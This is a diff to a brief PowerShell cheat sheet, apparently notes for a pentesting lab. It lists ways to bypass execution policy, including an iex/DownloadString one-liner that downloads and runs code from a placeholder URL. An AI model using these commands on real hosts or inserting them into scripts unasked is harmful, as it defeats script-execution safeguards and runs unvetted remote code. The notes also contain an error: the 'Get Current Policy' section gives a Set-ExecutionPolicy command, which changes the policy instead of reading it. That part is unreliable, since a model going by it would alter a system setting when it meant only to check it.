@@ -1,1 +1,11 @@
-powershell -executionpolicy bypass -file ".\Bot.ps1"
+## Execut powershell script bypassing current policy
+- powershell -executionpolicy bypass -file ".\Bot.ps1"
+- powershell -ex bypass -File thm.ps1
+- powershell -noprofile -noexit -c "Get-Content runme.ps1 | PowerShell.exe -noprofile -"
+- powershell -noprofile -c "iex(New-Object Net.WebClient).DownloadString('url')"
+
+## Modify current Execution policy
+- Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+## Get Current Policy
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
